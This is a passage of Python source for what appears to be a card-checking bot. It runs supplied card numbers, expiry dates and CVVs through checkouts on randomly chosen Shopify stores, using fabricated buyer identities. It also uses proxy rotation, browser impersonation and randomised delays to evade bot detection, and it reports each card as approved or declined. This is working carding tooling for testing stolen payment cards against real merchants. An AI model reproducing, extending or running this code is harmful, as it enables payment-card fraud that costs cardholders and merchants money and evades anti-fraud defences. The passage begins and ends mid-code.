            matches = re.findall(general_pattern, utilities_content)
            for match in matches:
                mutation_id, mutation_name = match
                if mutation_name not in mutation_ids:
                    mutation_ids[mutation_name] = mutation_id
                    print(f"Found additional mutation from utilities: {mutation_name} = {mutation_id}")
            
            return mutation_ids
            
        except Exception as e:
            print(f"Error extracting PollForReceipt from utilities: {e}")
            return {}
    
    def _get_site_mutation_ids(self, session, site_url: str, tokens: Dict[str, str] = None) -> Dict[str, str]:
        """Get mutation IDs for a specific site, with caching"""
        
        # Check cache first
        if site_url in self.site_mutation_cache:
            return self.site_mutation_cache[site_url]
        
        try:
            actions_url = None
            utilities_url = None
            
            # If tokens are provided and contain JavaScript URLs, use them
            if tokens and 'actions_js_url' in tokens:
                actions_path = tokens['actions_js_url']
                if actions_path.startswith('/'):
                    actions_url = f"{site_url}{actions_path}"
                else:
                    actions_url = f"{site_url}/{actions_path}"
                print(f"Using actions.js URL from tokens: {actions_url}")
                
                # Also get utilities.js URL if available
                if 'utilities_js_url' in tokens:
                    utilities_path = tokens['utilities_js_url']
                    if utilities_path.startswith('/'):
                        utilities_url = f"{site_url}{utilities_path}"
                    else:
                        utilities_url = f"{site_url}/{utilities_path}"
                    print(f"Using utilities.js URL from tokens: {utilities_url}")
            else:
                # Fallback: Get checkout page to find JavaScript URLs
                checkout_url = f"https://{site_url}/checkout"
                
                headers = {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'Upgrade-Insecure-Requests': '1'
                }
                
                response = session.get(checkout_url, headers=headers, timeout=15)
                
                if response.status_code != 200:
                    print(f"Failed to access checkout page: HTTP {response.status_code}")
                    return {}
                
                # Extract JavaScript URLs from checkout page
                actions_url = self._extract_actions_js_url(response.text, site_url)
                utilities_url = self._extract_utilities_js_url_from_response(response.text)
                
                if utilities_url and utilities_url.startswith('/'):
                    utilities_url = f"{site_url}{utilities_url}"
                
                if not actions_url:
                    print("Could not find actions.js URL in checkout page")
                    return {}
                
                print(f"Found actions.js URL from checkout page: {actions_url}")
                if utilities_url:
                    print(f"Found utilities.js URL from checkout page: {utilities_url}")
            
            # Fetch actions.js content
            actions_content = self._fetch_actions_js_content(session, actions_url)
            
            if not actions_content:
                print("Failed to fetch actions.js content")
                return {}
            
            # Extract mutation IDs from actions.js
            mutation_ids = self._extract_mutation_ids_from_actions(actions_content)
            
            # Fetch utilities.js content for PollForReceipt if URL is available
            if utilities_url:
                utilities_content = self._fetch_actions_js_content(session, utilities_url)
                if utilities_content:
                    # Extract PollForReceipt mutation ID from utilities.js
                    utilities_mutations = self._extract_poll_for_receipt_from_utilities(utilities_content)
                    if utilities_mutations:
                        mutation_ids.update(utilities_mutations)
                        print(f"Added PollForReceipt from utilities.js: {utilities_mutations}")
                else:
                    print("Failed to fetch utilities.js content")
            
            # Cache the results
            if mutation_ids:
                self.site_mutation_cache[site_url] = mutation_ids
            
            return mutation_ids
            
        except Exception as e:
            print(f"Error getting mutation IDs for site {site_url}: {e}")
            return {}
    
    def update_proxy(self, new_proxy: str):
        """Update the proxy configuration"""
        self.PROXY = new_proxy
        logger.info(f"Proxy updated to: {new_proxy[:50]}{'...' if len(new_proxy) > 50 else ''}")
    
    def _rotate_proxy_session(self, session):
        """Rotate proxy by creating a new session with fresh IP"""
        logger.info("Rotating proxy IP for fresh connection...")
        session.close()  # Close old session
        # Use curl_cffi with random browser impersonation to bypass bot detection
        impersonate = self._get_random_browser_impersonation()
        new_session = requests.Session(impersonate=impersonate)
        new_session.proxies = {"http": self.PROXY, "https": self.PROXY}
        # Add a small random delay to mimic human behavior
        sleep(random.uniform(0.1, 0.3))
        return new_session
    
    async def check_card(self, cc_number: str, month: int, year: int, cvv: str) -> Dict[str, Any]:
        """
        Main method to check a card through dynamic Shopify checkout
        Returns a dictionary with check results
        Includes automatic site removal and retry on receipt ID failures
        """
        start_time = time()
        max_retries = 3  # Maximum number of site retries
        retry_count = 0
        
        while retry_count < max_retries:
            # Get a random site from database
            current_site = await self.get_random_site()
            if not current_site:
                return {
                    'success': False,
                    'error': 'No sites configured. Please contact support for assistance.',
                    'result': 'ERROR',
                    'time_taken': time() - start_time,
                    'card_number': cc_number
                }
            
            # Create a fresh session for this card check
            session = self._create_fresh_session()
            
            try:
                logger.info(f"Starting dynamic card check for {cc_number[:6]}****{cc_number[-4:]} on {current_site} (attempt {retry_count + 1})")
                
                # Phase 1: Get products and find minimum price product
                logger.info("Phase 1: Getting products and finding minimum price product...")
                loop = asyncio.get_event_loop()
                
                products_data = await loop.run_in_executor(None, self._get_products, session, current_site)
                min_product = self._get_minimum_price_product(products_data)
                
                logger.info(f"✓ Phase 1 completed - Product: {min_product['title']}, Price: {min_product['price']}")
                
                # Phase 2: Create cart dynamically and get checkout tokens
                logger.info("Phase 2: Creating dynamic cart and getting checkout tokens...")
                cart_response = await loop.run_in_executor(None, self._create_dynamic_cart, session, current_site, min_product['id'])
                
                # Extract tokens from cart response
                tokens = self._extract_tokens_from_response(cart_response)
                if not tokens:
                    raise Exception("Failed to extract checkout tokens - site may have invalid cart structure")
                print(tokens)
                logger.info("✓ Phase 2 completed - Dynamic cart created and tokens extracted")
                
                # Delay after creating cart and before tokenizing card
                logger.info("⏳ Waiting 1.5 seconds after cart creation...")
                await asyncio.sleep(1.5)
                
                # Phase 3: Create payment session
                logger.info("Phase 3: Creating payment session...")
                domain = urlparse(current_site).netloc
                cc_session_id, cc_bin = await loop.run_in_executor(None, self._create_payment_session, session, domain, cc_number, month, year, cvv)
                
                # Add CC BIN to tokens
                tokens['cc_bin'] = cc_bin
                
                logger.info(f"✓ Phase 3 completed - Payment session: {cc_session_id}")
                
                # Delay before calling proposal API for the first time
                logger.info("⏳ Waiting 3 seconds before proposal API...")
                await asyncio.sleep(3.0)
                
                # Phase 4: Submit proposal and get delivery/tax info
                logger.info("Phase 4: Submitting proposal...")
                address = self._get_address_for_site(current_site, tokens.get('currency', 'USD'), tokens.get('country_code', 'US'))
                proposal_result = await loop.run_in_executor(None, self._submit_proposal, session, current_site, tokens, min_product, address)
                
                logger.info("✓ Phase 4 completed - Proposal submitted")
                
                # Delay before calling submit for completion API
                logger.info("⏳ Waiting 1.5 seconds before submit for completion...")
                await asyncio.sleep(1.5)
                
                # Phase 5: Submit checkout for completion with warning system
                logger.info("Phase 5: Submitting checkout for completion...")
                try:
                    checkout_result = await loop.run_in_executor(None, self._submit_checkout, session, current_site, tokens, min_product, address, cc_session_id, proposal_result)
                    
                    # Reset warnings for this site since submit for completion succeeded
                    await self.reset_site_warning(current_site)
                    
                    logger.info("✓ Phase 5 completed - Checkout submitted")
                    
                except Exception as submit_error:
                    submit_error_msg = str(submit_error).lower()
                    
                    # Check if this is an out of stock error (immediate removal)
                    if any(stock_phrase in submit_error_msg for stock_phrase in [
                        'item is out of stock', 'out of stock', 'sold out', 'stock_problems',
                        'some items in your cart are no longer available',
                        'this product is currently unavailable',
                        'this item is currently out of stock'
                    ]):
                        logger.warning(f"Out of stock error in submit for completion on {current_site}, removing site")
                        await self.remove_site(current_site)
                        raise submit_error
                    
                    # For other submit for completion errors, add warning
                    logger.warning(f"Submit for completion failed on {current_site}: {submit_error}")
                    site_removed = await self.add_site_warning(current_site)
                    
                    if site_removed:
                        # Site was removed due to multiple warnings, retry with different site
                        raise Exception(f"Submit for completion failed multiple times on {current_site} - site removed")
                    else:
                        # First warning, continue with this attempt but log the warning
                        raise submit_error
                
                # Phase 6: Poll for receipt - no retry needed since polling returns DECLINED on timeout
                logger.info("Phase 6: Polling for receipt...")
                receipt_result = await loop.run_in_executor(None, self._poll_receipt, session, current_site, tokens, checkout_result.get('receipt_id'), 0)
                
                total_time = time() - start_time
                logger.info(f"Dynamic card check completed in {total_time:.2f}s - Result: {receipt_result.get('result', 'UNKNOWN')}")
                
                # Format final result
                result = {
                    'card_number': cc_number,
                    'time_taken': total_time,
                    'site': current_site,
                    'product': min_product['title'],
                    'price': proposal_result.get('total_amount', min_product['price']),
                    'response': receipt_result
                }
                
                # Determine success based on receipt result
                if receipt_result.get('result') == 'APPROVED':
                    result.update({
                        'success': True,
                        'result': 'APPROVED',
                        'status': '✅ APPROVED'
                    })
                elif receipt_result.get('result') == 'DECLINED':
                    result.update({
                        'success': False,
                        'result': 'DECLINED',
                        'status': '❌ DECLINED',
                        'error_code': receipt_result.get('error_code', 'CARD_DECLINED')
                    })
                else:
                    result.update({
                        'success': False,
                        'result': 'DECLINED',
                        'status': '❌ Generic Decline',
                        'error': receipt_result.get('error', 'Unknown error')
                    })
                
                return result
                
            except Exception as e:
                error_message = str(e)
                logger.error(f"Error in dynamic card check on {current_site}: {e}")
                
                # Check if this is a site-breaking error that requires immediate site removal
                # Submit for completion errors are handled by warning system above
                # Polling timeouts no longer remove sites - they return DECLINED instead
                if any(error_phrase in error_message.lower() for error_phrase in [
                    # Cart creation errors (immediate removal)
                    'failed to extract checkout tokens',
                    'failed to create dynamic cart',
                    'error creating dynamic cart',
                    'cart creation failed',
                    'invalid cart response',
                    'no checkout tokens',
                    'checkout tokens',
                    'token extraction failed',
                    # Out of stock errors (immediate removal) - handled above in submit phase
                    'item is out of stock',
                    'out of stock',
                    'sold out',
                    'stock_problems',
                    'some items in your cart are no longer available',
                    'this product is currently unavailable',
                    'this item is currently out of stock',
                    # Product/site structure errors (immediate removal)
                    'no products found',
                    'invalid json format',
                    'missing products key',
                    'products.json',
                    'site not accessible',
                    'site unavailable',
                    # Payment session errors (immediate removal)
                    'payment session failed',
                    'failed to create payment session',
                    'payment method not available',
                    # Proposal errors (critical ones - immediate removal)
                    'proposal failed',
                    'failed to submit proposal',
                    'invalid proposal response',
                    # General site errors (immediate removal)
                    'site error',
                    'shopify site error',
                    'checkout not available',
                    'site maintenance',
                    'temporarily unavailable',
                    # Submit for completion multiple failures (handled by warning system)
                    'submit for completion failed multiple times'
                ]):
                    logger.warning(f"Site {current_site} has critical errors, removing from database")
                    await self.remove_site(current_site)
                    retry_count += 1
                    
                    # If we have more retries available, continue to next site
                    if retry_count < max_retries:
                        logger.info(f"Retrying with different site (attempt {retry_count + 1}/{max_retries})")
                        session.close()
                        continue
                
                # For other errors or if we've exhausted retries, return error
                return {
                    'success': False,
                    'error': error_message,
                    'result': 'DECLINED',
                    'status': '❌ Generic Decline',
                    'time_taken': time() - start_time,
                    'card_number': cc_number,
                    'site': current_site,
                    'response': {}
                }
            finally:
                # Always close the session to free resources
                session.close()
        
        # If we've exhausted all retries
        return {
            'success': False,
            'error': f'All sites failed after {max_retries} attempts. Please add more sites.',
            'result': 'DECLINED',
            'status': '❌ Generic Decline',
            'time_taken': time() - start_time,
            'card_number': cc_number,
            'response': {}
        }
    
    def _get_products(self, session, site_url: str) -> str:
        """Get products.json from the site"""
        try:
            # Add realistic headers to avoid detection
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'no-cache',
                'pragma': 'no-cache',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': self.COMMON_HEADERS['user-agent'],
            }
            # Add small random delay to mimic human behavior
            sleep(random.uniform(0.2, 0.5))
            response = session.get(f"{site_url}/products.json", headers=headers, timeout=30)
            response.raise_for_status()
            return response.text
        except Exception as e:
            logger.error(f"Error getting products: {e}")
            raise
    
    def _create_dynamic_cart(self, session, site_url: str, product_id: str) -> str:
        """Create cart dynamically with the minimum price product - just like index.php"""
        try:
            # Create cart URL dynamically with the found product ID
            cart_url = f"{site_url}/cart/{product_id}:1"
            
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': self.COMMON_HEADERS['user-agent'],
            }
            
            # Add small random delay to mimic human behavior
            sleep(random.uniform(0.3, 0.7))
            
            response = session.get(cart_url, headers=headers, allow_redirects=True, timeout=30)
            response.raise_for_status()
            
            # Check for out of stock - just like index.php
            out_of_stock_keywords = [
                'stock_problems', 'Some items in your cart are no longer available',
                'This product is currently unavailable', 'out of stock', 'Sold Out',
                'This item is currently out of stock but will be shipped once available'
            ]
            
            for keyword in out_of_stock_keywords:
                if response.text and keyword.lower() in response.text.lower():
                    raise Exception("Item is out of stock")
            
            return response.text
            
        except Exception as e:
            logger.error(f"Error creating dynamic cart: {e}")
            raise
    
    def _extract_tokens_from_response(self, response_text: str) -> Optional[Dict[str, str]]:
        """Extract necessary tokens and JavaScript URLs from cart response - just like index.php"""
        try:
            tokens = {}
            with open("res.html", "w",  encoding='utf-8') as f:
                f.write(response_text)
            # Extract session token
            session_token = self._find_between(response_text, '<meta name="serialized-sessionToken" content="&quot;', '&quot;"')
            if not session_token:
                return None
            tokens['session_token'] = session_token
            
            # Extract queue token
            queue_token = self._find_between(response_text, 'queueToken&quot;:&quot;', '&quot;')
            if not queue_token:
                return None
            tokens['queue_token'] = queue_token
            
            # Extract currency
            currency = self._find_between(response_text, '&quot;currencyCode&quot;:&quot;', '&quot;')
            tokens['currency'] = currency or 'USD'
            
            # Extract country code
            country_code = self._find_between(response_text, '&quot;countryCode&quot;:&quot;', '&quot;')
            tokens['country_code'] = country_code or 'US'
            
            # Extract stable ID
            stable_id = self._find_between(response_text, 'stableId&quot;:&quot;', '&quot;')
            if not stable_id:
                return None
            tokens['stable_id'] = stable_id
            
            # Extract payment method identifier
            payment_method_identifier = self._find_between(response_text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
            tokens['payment_method_identifier'] = payment_method_identifier or ''
            
            # Extract delivery method type
            is_shipping_required = self._find_between(response_text, '&quot;requiresShipping&quot;:', ',&quot;')
            # print(deliv)
            tokens['delivery_method_type'] = is_shipping_required == 'true' and 'SHIPPING' or 'NONE'

            # Extract delivery amount
            delivery_amount = self._find_between(response_text, '{&quot;amount&quot;:&quot;', '&quot;')
            tokens['delivery_amount'] = delivery_amount or None
            print(tokens['delivery_amount'])
            
            # Extract checkout token from URL
            checkout_token = ''
            match = re.search(r'/cn/([^/?]+)', response_text)
            if match:
                checkout_token = match.group(1)
            tokens['checkout_token'] = checkout_token
            
            # Extract actions.js URL from the same response
            actions_js_url = self._extract_actions_js_url_from_response(response_text)
            if actions_js_url:
                tokens['actions_js_url'] = actions_js_url
                print(f"Found actions.js URL: {actions_js_url}")
            
            # Extract utilities.js URL from the same response (for PollForReceipt)
            utilities_js_url = self._extract_utilities_js_url_from_response(response_text)
            if utilities_js_url:
                tokens['utilities_js_url'] = utilities_js_url
                print(f"Found utilities.js URL: {utilities_js_url}")
            
            print(tokens)
            return tokens
            
        except Exception as e:
            logger.error(f"Error extracting tokens: {e}")
            return None
    
    def _extract_actions_js_url_from_response(self, response_text: str) -> Optional[str]:
        """Extract actions.js URL from checkout page response"""
        try:
            # Look for the actions.js file pattern in the HTML
            patterns = [
                r'"/cdn/shopifycloud/checkout-web/assets/c1/actions\.([^"]+)\.js"',
                r'"(/cdn/shopifycloud/checkout-web/assets/[^"]*actions[^"]*\.js)"',
                r'"/cdn/shopifycloud/checkout-web/assets/[^"]*actions[^"]*\.js"'
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, response_text)
                if matches:
                    # Take the first match and construct relative path
                    actions_path = matches[0]
                    if not actions_path.startswith('/'):
                        # If it's just the hash part, construct the full path
                        actions_path = f"/cdn/shopifycloud/checkout-web/assets/c1/actions.{actions_path}.js"
                    
                    return actions_path  # Return relative path, will be made absolute later
            
            # Alternative approach: look for any reference to actions file
            action_pattern = r'"([^"]*actions[^"]*\.js)"'
            matches = re.findall(action_pattern, response_text)
            for match in matches:
                if 'shopifycloud' in match:
                    return match  # Return the path as found
            
            return None
            
        except Exception as e:
            print(f"Error extracting actions.js URL from response: {e}")
            return None

    def _extract_utilities_js_url_from_response(self, response_text: str) -> Optional[str]:
        """Extract utilities JavaScript URL from checkout response for PollForReceipt mutation"""
        try:
            # Look for the utilities-FullScreenBackground.js file pattern in the response
            patterns = [
                r'"/cdn/shopifycloud/checkout-web/assets/c1/utilities-FullScreenBackground\.([^"]+)\.js"',
                r'"(/cdn/shopifycloud/checkout-web/assets/[^"]*utilities-FullScreenBackground[^"]*\.js)"',
                r'"/cdn/shopifycloud/checkout-web/assets/[^"]*utilities-FullScreenBackground[^"]*\.js"'
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, response_text)
                if matches:
                    # Take the first match and construct relative path
                    utilities_path = matches[0]
                    if not utilities_path.startswith('/'):
                        # If it's just the hash part, construct the full path
                        utilities_path = f"/cdn/shopifycloud/checkout-web/assets/c1/utilities-FullScreenBackground.{utilities_path}.js"
                    
                    return utilities_path  # Return relative path, will be made absolute later
            
            # Alternative approach: look for any reference to utilities file
            utilities_pattern = r'"([^"]*utilities-FullScreenBackground[^"]*\.js)"'
            matches = re.findall(utilities_pattern, response_text)
            for match in matches:
                if 'shopifycloud' in match:
                    return match  # Return the path as found
            
            return None
            
        except Exception as e:
            print(f"Error extracting utilities.js URL from response: {e}")
            return None
    
    def _find_between(self, text: str, start: str, end: str) -> Optional[str]:
        """Extract text between two delimiters"""
        try:
            start_index = text.index(start) + len(start)
            end_index = text.index(end, start_index)
            return text[start_index:end_index]
        except ValueError:
            return None
    
    def _create_payment_session(self, session, domain: str, cc_number: str, month: int, year: int, cvv: str) -> tuple[str, str]:
        """Create payment session with card details - just like index.php"""
        try:
            headers = {
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://checkout.pci.shopifyinc.com',
                'referer': 'https://checkout.pci.shopifyinc.com/',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': self.COMMON_HEADERS['user-agent'],
            }
            
            # Convert month to int if it's string with leading zero
            month_int = int(month) if isinstance(month, str) else month
            
            # Extract CC BIN (first 8 digits)
            cc_bin = cc_number[:8] if len(cc_number) >= 8 else cc_number[:6]
            
            payload = {
                "credit_card": {
                    "number": cc_number,
                    "month": month_int,
                    "year": year,
                    "verification_value": cvv,
                    "start_month": None,
                    "start_year": None,
                    "issue_number": "",
                    "name": fake.name()
                },
                "payment_session_scope": domain
            }
            
            # Add small random delay to mimic human behavior
            sleep(random.uniform(0.2, 0.5))
            
            response = session.post(
                'https://checkout.pci.shopifyinc.com/sessions',
                headers=headers,
                json=payload,
                timeout=30
            )
            response.raise_for_status()
            
            data = response.json()
            if 'id' not in data:
                raise Exception("Payment session ID not found in response")
            
            return data['id'], cc_bin
            
        except Exception as e:
            logger.error(f"Error creating payment session: {e}")
            raise
    
    def _submit_proposal(self, session, site_url: str, tokens: Dict[str, str], min_product: Dict[str, Any], address: Dict[str, str]) -> Dict[str, Any]:
        """Submit proposal to get delivery and tax information using mutation IDs"""
        try:
            # Get mutation IDs for this site, passing tokens for actions.js URL
            mutation_ids = self._get_site_mutation_ids(session, site_url, tokens)
            if not mutation_ids or 'Proposal' not in mutation_ids:
                raise ValueError("Could not get Proposal mutation ID for site")
            
            # Determine delivery method type from cart response
            delivery_method_type = tokens.get('delivery_method_type', 'NONE')
            
            # Single proposal call for both NONE and SHIPPING - like index.php
            logger.info(f"Submitting single proposal for {delivery_method_type} delivery method...")
            
            # First proposal call without handle to get available delivery strategies
            proposal_payload = self._build_proposal_payload(tokens, min_product, address, delivery_method_type, delivery_handle=None, mutation_ids=mutation_ids)
            
            headers = self._build_proposal_headers(site_url, tokens)
            
            response = session.post(
                f'{site_url}/checkouts/internal/graphql/persisted?operationName=Proposal',
                headers=headers,
                json=proposal_payload,
                timeout=30
            )
            response.raise_for_status()
            
            data = response.json()
            return self._extract_proposal_result(data, min_product, address)
                
        except Exception as e:
            logger.error(f"Error in proposal process: {e}")
            raise

    def _build_proposal_payload(self, tokens: Dict[str, str], min_product: Dict[str, Any], address: Dict[str, str], delivery_method_type: str, delivery_handle: str = None, mutation_ids: Dict[str, str] = None) -> Dict[str, Any]:
        """Build proposal payload using mutation IDs instead of GraphQL queries"""
        
        if not mutation_ids or 'Proposal' not in mutation_ids:
            raise ValueError("Proposal mutation ID not found")
        
        base_variables = {
            'sessionInput': {'sessionToken': tokens['session_token']},
            'queueToken': tokens['queue_token'],
            'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
            'deliveryExpectations': {'deliveryExpectationLines': []},
            'merchandise': {
                'merchandiseLines': [{
                    'stableId': tokens['stable_id'],
                    'merchandise': {
                        'productVariantReference': {
                            'id': f'gid://shopify/ProductVariantMerchandise/{min_product["id"]}',
                            'variantId': f'gid://shopify/ProductVariant/{min_product["id"]}',
                            'properties': [],
                            'sellingPlanId': None,
                            'sellingPlanDigest': None
                        }
                    },
                    'quantity': {'items': {'value': 1}},
                    'expectedTotalPrice': {
                        'value': {
                            'amount': min_product['price'],
                            'currencyCode': address['currency']
                        }
                    },
                    'lineComponentsSource': None,
                    'lineComponents': []
                }]
            },
            'memberships': {'memberships': []},
            'payment': {
                'totalAmount': {'any': True},
                'paymentLines': [],  # Empty for Proposal
                'billingAddress': {
                    'streetAddress': {
                        'address1': address['street'],
                        'city': address['city'],
                        'countryCode': address['country'],
                        'postalCode': address['postcode'],
                        'firstName': fake.first_name(),
                        'lastName': fake.last_name(),
                        'zoneCode': address['state'],
                        'phone': self._get_random_phone(address['country'])
                    }
                }
            },
            'buyerIdentity': {
                'customer': {
                    'presentmentCurrency': address['currency'],
                    'countryCode': address['country']
                },
                'email': self._get_random_email(),
                'emailChanged': False,
                'phoneCountryCode': address['country'],
                'marketingConsent': [{'email': {'value': self._get_random_email()}}],
                'shopPayOptInPhone': {
                    'number': self._get_random_phone(address['country']),
                    'countryCode': address['country']
                },
                'rememberMe': False
            },
            'tip': {'tipLines': []},
            'taxes': {
                'proposedAllocations': None,
                'proposedTotalAmount': {
                    'value': {'amount': '0', 'currencyCode': address['currency']}
                },
                'proposedTotalIncludedAmount': None,
                'proposedMixedStateTotalAmount': None,
                'proposedExemptions': []
            },
            'note': {'message': None, 'customAttributes': []},
            'localizationExtension': {'fields': []},
            'nonNegotiableTerms': None,
            'scriptFingerprint': {
                'signature': None,
                'signatureUuid': None,
                'lineItemScriptChanges': [],
                'paymentScriptChanges': [],
                'shippingScriptChanges': []
            },
            'optionalDuties': {'buyerRefusesDuties': False},
            'cartMetafields': [],
            'includeTaxStrategyLines': False
        }

        if delivery_method_type == 'NONE':
            # NONE delivery method
            base_variables['delivery'] = {
                'deliveryLines': [{
                    'selectedDeliveryStrategy': {
                        'deliveryStrategyMatchingConditions': {
                            'estimatedTimeInTransit': {'any': True},
                            'shipments': {'any': True}
                        },
                        'options': {}
                    },
                    'targetMerchandiseLines': {
                        'lines': [{'stableId': tokens['stable_id']}]
                    },
                    'deliveryMethodTypes': ['NONE'],
                    'expectedTotalPrice': {'any': True},
                    'destinationChanged': True
                }],
                'noDeliveryRequired': [],
                'useProgressiveRates': False,
                'prefetchShippingRatesStrategy': None,
                'supportsSplitShipping': True
            }
        else:
            # SHIPPING delivery method - use handle from cart response like index.php
            if delivery_handle:
                # Use specific delivery handle from cart response
                selected_delivery_strategy = {
                    'deliveryStrategyByHandle': {
                        'handle': delivery_handle,
                        'customDeliveryRate': False
                    },
                    'options': {'phone': '887'}
                }
                expected_total_price = {'any': True}
            else:
                # Fallback to matching conditions if no handle
                selected_delivery_strategy = {
                    'deliveryStrategyMatchingConditions': {
                        'estimatedTimeInTransit': {'any': True},
                        'shipments': {'any': True}
                    },
                    'options': {}
                }
                expected_total_price = {'any': True}

            base_variables['delivery'] = {
                'deliveryLines': [{
                    'destination': {
                        'partialStreetAddress': {  # Changed from streetAddress to partialStreetAddress
                            'address1': address['street'],
                            'city': address['city'],
                            'countryCode': address['country'],
                            'postalCode': address['postcode'],
                            'firstName': fake.first_name(),
                            'lastName': fake.last_name(),
                            'zoneCode': address['state'],
                            'phone': self._get_random_phone(address['country']),
                            'oneTimeUse': False
                        }
                    },
                    'selectedDeliveryStrategy': selected_delivery_strategy,
                    'targetMerchandiseLines': {
                        'lines': [{'stableId': tokens['stable_id']}]
                    },
                    'deliveryMethodTypes': ['SHIPPING'],
                    'expectedTotalPrice': expected_total_price,
                    'destinationChanged': True  # Changed from False to True for Proposal
                }],
                'noDeliveryRequired': [],
                'useProgressiveRates': False,
                'prefetchShippingRatesStrategy': None,
                'supportsSplitShipping': True
            }

        return {
            'variables': base_variables,
            'operationName': 'Proposal',
            'id': mutation_ids['Proposal']
        }
    
    def _build_submit_for_completion_payload(self, tokens: Dict[str, str], min_product: Dict[str, Any], 
                                           address: Dict[str, str], cc_session_id: str, proposal_result: Dict[str, Any],
                                           delivery_method_type: str, mutation_ids: Dict[str, str], site_url: str) -> Dict[str, Any]:
        """Build SubmitForCompletion payload using mutation ID"""
        
        if not mutation_ids or 'SubmitForCompletion' not in mutation_ids:
            raise ValueError("SubmitForCompletion mutation ID not found")
        
        # Extract signedHandle from proposal result if available
        signed_handle = None
        if 'signed_handle' in proposal_result:
            signed_handle = proposal_result['signed_handle']
        
        base_input = {
            'sessionInput': {'sessionToken': tokens['session_token']},
            'queueToken': tokens['queue_token'],
            'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
            'delivery': {
                'deliveryLines': [{
                    'destination': {
                        'streetAddress': {
                            'address1': address['street'],
                            'city': address['city'],
                            'countryCode': address['country'],
                            'postalCode': address['postcode'],
                            'firstName': fake.first_name(),
                            'lastName': fake.last_name(),
                            'zoneCode': address['state'],
                            'phone': self._get_random_phone(address['country']),
                            'oneTimeUse': False
                        }
                    },
                    'selectedDeliveryStrategy': {
                        'deliveryStrategyByHandle': {
                            'handle': proposal_result.get('handle', ''),
                            'customDeliveryRate': False
                        },
                        'options': {'phone': '887'}
                    },
                    'targetMerchandiseLines': {
                        'lines': [{'stableId': tokens['stable_id']}]
                    },
                    'deliveryMethodTypes': ['SHIPPING'],
                    'expectedTotalPrice': {
                        'value': {
                            'amount': proposal_result['delivery_amount'],
                            'currencyCode': address['currency']
                        }
                    },
                    'destinationChanged': False
                }],
                'noDeliveryRequired': [],
                'useProgressiveRates': False,
                'prefetchShippingRatesStrategy': None,
                'supportsSplitShipping': True
            },
            'deliveryExpectations': {
                'deliveryExpectationLines': [
                    {'signedHandle': signed_handle}
                ] if signed_handle else []
            },
            'merchandise': {
                'merchandiseLines': [{
                    'stableId': tokens['stable_id'],
                    'merchandise': {
                        'productVariantReference': {
                            'id': f'gid://shopify/ProductVariantMerchandise/{min_product["id"]}',
                            'variantId': f'gid://shopify/ProductVariant/{min_product["id"]}',
                            'properties': [],
                            'sellingPlanId': None,
                            'sellingPlanDigest': None
                        }
                    },
                    'quantity': {'items': {'value': 1}},
                    'expectedTotalPrice': {
                        'value': {
                            'amount': min_product['price'],
                            'currencyCode': address['currency']
                        }
                    },
                    'lineComponentsSource': None,
                    'lineComponents': []
                }]
            },
            'memberships': {'memberships': []},
            'payment': {
                'totalAmount': {'any': True},
                'paymentLines': [{
                    'paymentMethod': {
                        'directPaymentMethod': {
                            'paymentMethodIdentifier': tokens.get('payment_method_identifier', ''),
                            'sessionId': cc_session_id,
                            'billingAddress': {
                                'streetAddress': {
                                    'address1': address['street'],
                                    'city': address['city'],
                                    'countryCode': address['country'],
                                    'postalCode': address['postcode'],
                                    'firstName': fake.first_name(),
                                    'lastName': fake.last_name(),
                                    'zoneCode': address['state'],
                                    'phone': self._get_random_phone(address['country'])
                                }
                            },
                            'cardSource': None
                        },
                        'giftCardPaymentMethod': None,
                        'redeemablePaymentMethod': None,
                        'walletPaymentMethod': None,
                        'walletsPlatformPaymentMethod': None,
                        'localPaymentMethod': None,
                        'paymentOnDeliveryMethod': None,
                        'paymentOnDeliveryMethod2': None,
                        'manualPaymentMethod': None,
                        'customPaymentMethod': None,
                        'offsitePaymentMethod': None,
                        'customOnsitePaymentMethod': None,
                        'deferredPaymentMethod': None,
                        'customerCreditCardPaymentMethod': None,
                        'paypalBillingAgreementPaymentMethod': None,
                        'remotePaymentInstrument': None
                    },
                    'amount': {
                        'value': {
                            'amount': proposal_result['total_amount'],
                            'currencyCode': address['currency']
                        }
                    }
                }],
                'billingAddress': {
                    'streetAddress': {
                        'address1': address['street'],
                        'city': address['city'],
                        'countryCode': address['country'],
                        'postalCode': address['postcode'],
                        'firstName': fake.first_name(),
                        'lastName': fake.last_name(),
                        'zoneCode': address['state'],
                        'phone': self._get_random_phone(address['country'])
                    }
                },
                'creditCardBin': tokens.get('cc_bin', '')
            },
            'buyerIdentity': {
                'customer': {
                    'presentmentCurrency': address['currency'],
                    'countryCode': address['country']
                },
                'email': self._get_random_email(),
                'emailChanged': False,
                'phoneCountryCode': address['country'],
                'marketingConsent': [{'email': {'value': self._get_random_email()}}],
                'shopPayOptInPhone': {
